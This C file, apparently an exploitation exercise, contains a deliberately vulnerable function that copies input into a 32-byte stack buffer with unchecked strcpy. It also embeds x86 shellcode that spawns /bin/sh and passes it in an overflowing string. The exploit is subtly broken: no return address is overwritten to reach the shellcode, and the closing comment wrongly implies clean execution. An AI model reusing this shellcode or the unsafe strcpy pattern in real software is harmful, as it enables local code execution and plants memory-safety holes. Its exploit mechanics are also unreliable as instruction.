// test_shellcode.c

#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[32];
    strcpy(buffer, input);
}

int main() {
    char exploit_string[40];
    unsigned char shellcode[] = 
        "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    
    // Fill the exploit string with 'A's and append the shellcode
    memset(exploit_string, 'A', sizeof(exploit_string) - 1);
    memcpy(exploit_string + sizeof(exploit_string) - sizeof(shellcode), shellcode, sizeof(shellcode));

    // Null terminate the string
    exploit_string[sizeof(exploit_string) - 1] = '\0';

    // Run the vulnerable program with the exploit string
    vulnerable_function(exploit_string);

    printf("Program continues executing...\n");

    return 0;
}

